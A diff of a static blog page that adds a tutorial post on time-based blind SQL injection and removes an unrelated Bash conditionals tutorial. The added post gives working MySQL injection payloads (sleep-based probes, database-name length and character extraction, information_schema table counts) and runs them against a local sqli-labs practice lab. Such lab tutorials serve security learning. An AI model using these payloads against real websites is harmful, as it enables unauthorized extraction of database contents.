@@ -158,6 +158,102 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/28/SQLInjectionTimeBasedBlind/" class="post-title-link" itemprop="url">Time-Based Blind SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-28 22:31:42" itemprop="dateCreated datePublished" datetime="2016-10-28T22:31:42-04:00">2016-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 20:37:49" itemprop="dateModified" datetime="2023-10-18T20:37:49-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Time-Based Blind SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Time-Based-Blind-SQL-Injection-Steps"><a href="#Time-Based-Blind-SQL-Injection-Steps" class="headerlink" title="Time-Based Blind SQL Injection Steps:"></a>Time-Based Blind SQL Injection Steps:</h1><ol>
+<li>First, check if an injection vulnerability exists.</li>
+<li>Next, determine the injection type: character-based, numeric-based, or search-based.</li>
+<li>Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and 1=2 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and sleep(5) %23  </span><br></pre></td></tr></table></figure>
+ Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection.</li>
+<li>Start by obtaining the length of the database name:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)</span><br><span class="line">?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay)</span><br></pre></td></tr></table></figure>
+This indicates that the database name has a length of 8 characters.</li>
+<li>Proceed to retrieve the database name character by character:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23</span><br></pre></td></tr></table></figure>
+These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name.</li>
+</ol>
+<h1 id="Example-of-Time-Based-Blind-SQL-Injection-Operation"><a href="#Example-of-Time-Based-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Time-Based Blind SQL Injection Operation:"></a>Example of Time-Based Blind SQL Injection Operation:</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1\ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23  响应的比较快,说明不是数字型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/27/SQLInjectionBooleanBlind/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -996,181 +1092,6 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2012/03/17/BashScript05-IfElseElifStatements/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2012/03/17/BashScript05-IfElseElifStatements/" class="post-title-link" itemprop="url">Bash Scripting 05 - If, Else, Elif Statements</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2012-03-17 22:24:49" itemprop="dateCreated datePublished" datetime="2012-03-17T22:24:49-04:00">2012-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-23 21:53:23" itemprop="dateModified" datetime="2023-10-23T21:53:23-04:00">2023-10-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/" itemprop="url" rel="index"><span itemprop="name">Bash</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/Bash-Scripting-05-If-Else-Elif-Statements/" itemprop="url" rel="index"><span itemprop="name">Bash Scripting 05 - If, Else, Elif Statements</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Conditional statements allow us to perform different actions based on different conditions. The<br>most common conditional Bash statements include if, else, and elif.<br>The if statement is relatively simple–it checks to see if a condition is true–but it requires a very<br>specific syntax. Pay careful attention to this syntax, especially the use of required spaces:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ &lt;some <span class="built_in">test</span>&gt; ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">&lt;perform an action&gt;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-
-<p>In this listing, if “some test” evaluates as true, the script will “perform an action”, or any commands<br>between then and fi. Let’s look at an actual example:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./if.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># if statement example</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;What is your age: &quot;</span> age</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$age</span> -lt 16 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You might need parental permission to take this course!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./if.sh</span><br><span class="line">kali@kali:~$ ./if.sh</span><br><span class="line">What is your age: 15</span><br><span class="line">You might need parental permission to take this course!</span><br></pre></td></tr></table></figure>
-
-<p>In this example, we used an if statement to check the age entered by a user. If the entered age was<br>less than (-lt) 16, the script would output a warning message.<br>The square brackets (“[“ and “]”) in the if statement above are actually a reference to the test<br>command. This simply means we can use all of the operators that are allowed by the test<br>command. Some of the most common operators include:</p>
-<table>
-<thead>
-<tr>
-<th>Operator</th>
-<th>Description: Expression True if…</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>!EXPRESSION</td>
-<td>The EXPRESSION is false.</td>
-</tr>
-<tr>
-<td>-n STRING</td>
-<td>STRING length is greater than zero</td>
-</tr>
-<tr>
-<td>-z STRING</td>
-<td>The length of STRING is zero (empty)</td>
-</tr>
-<tr>
-<td>STRING1 !&#x3D; STRING2</td>
-<td>STRING1 is not equal to STRING2</td>
-</tr>
-<tr>
-<td>STRING1 &#x3D; STRING2</td>
-<td>STRING1 is equal to STRING2</td>
-</tr>
-<tr>
-<td>INTEGER1 -eq INTEGER2</td>
-<td>INTEGER1 is equal to INTEGER2</td>
-</tr>
-<tr>
-<td>INTEGER1 -ne INTEGER2</td>
-<td>INTEGER1 is not equal to INTEGER2</td>
-</tr>
-<tr>
-<td>INTEGER1 -gt INTEGER2</td>
-<td>INTEGER1 is greater than INTEGER2</td>
-</tr>
-<tr>
-<td>INTEGER1 -lt INTEGER2</td>
-<td>INTEGER1 is less than INTEGER2</td>
-</tr>
-<tr>
-<td>INTEGER1 -ge INTEGER2</td>
-<td>INTEGER1 is greater than or equal to INTEGER 2</td>
-</tr>
-<tr>
-<td>INTEGER1 -le INTEGER2</td>
-<td>INTEGER1 is less than or equal to INTEGER 2</td>
-</tr>
-<tr>
-<td>-d FILE</td>
-<td>FILE exists and is a directory</td>
-</tr>
-<tr>
-<td>-e FILE</td>
-<td>FILE exists</td>
-</tr>
-<tr>
-<td>-r FILE</td>
-<td>FILE exists and has read permission</td>
-</tr>
-<tr>
-<td>-s FILE</td>
-<td>FILE exists and it is not empty</td>
-</tr>
-<tr>
-<td>-w FILE</td>
-<td>FILE exists and has write permission</td>
-</tr>
-<tr>
-<td>-x FILE</td>
-<td>FILE exists and has execute permission</td>
-</tr>
-</tbody></table>
-<p>With the above in mind, our previous example using if can be rewritten without square brackets as<br>follows:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./if2.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># if statement example 2</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;What is your age: &quot;</span> age</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$age</span> -lt 16</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You might need parental permission to take this course!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./if2.sh</span><br><span class="line">kali@kali:~$ ./if2.sh</span><br><span class="line">What is your age: 15</span><br><span class="line">You might need parental permission to take this course!</span><br></pre></td></tr></table></figure>
-
-<p>Even though this example is functionally equivalent to the example using square brackets, using<br>square brackets makes the code slightly easier to read.<br>We can also perform a certain set of actions if a statement is true and another set if it is false. To<br>do this, we can use the else statement, which has the following syntax:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ &lt;some <span class="built_in">test</span>&gt; ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">&lt;perform action&gt;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&lt;perform another action&gt;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-<p>Let’s extend our previous “age” example to include the else statement:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./else.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># else statement example</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;What is your age: &quot;</span> age</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$age</span> -lt 16 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You might need parental permission to take this course!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to the course!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./else.sh</span><br><span class="line">kali@kali:~$ ./else.sh</span><br><span class="line">What is your age: 21</span><br><span class="line">Welcome to the course!</span><br></pre></td></tr></table></figure>
-
-<p>Notice that the else statement was executed when the entered age was greater than (or more<br>specifically “not less than”) sixteen.<br>The if and else statements only allow two code execution branches. We can add additional<br>branches with the elif statement which uses the following pattern:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ &lt;some <span class="built_in">test</span>&gt; ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">&lt;perform action&gt;</span><br><span class="line"><span class="keyword">elif</span> [ &lt;some <span class="built_in">test</span>&gt; ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">&lt;perform different action&gt;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&lt;perform yet another different action&gt;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-
-<p>Let’s again extend our “age” example to include the elif statement:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./elif.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># elif example</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;What is your age: &quot;</span> age</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$age</span> -lt 16 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You might need parental permission to take this course!&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$age</span> -gt 60 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hats off to you, respect!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to the course!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./elif.sh</span><br><span class="line">kali@kali:~$ ./elif.sh</span><br><span class="line">What is your age: 65</span><br><span class="line">Hats off to you, respect!</span><br></pre></td></tr></table></figure>
-
-<p>In this example, the code execution flow was slightly more complex. In order of operation, the then<br>branch executes if the entered age is less than sixteen, the elif branch is entered (and the “Hats<br>off..” message displayed) if the age is greater than sixty, and the else branch executes only if the<br>age is greater than sixteen but less than sixty.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1242,19 +1163,19 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-count">66</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
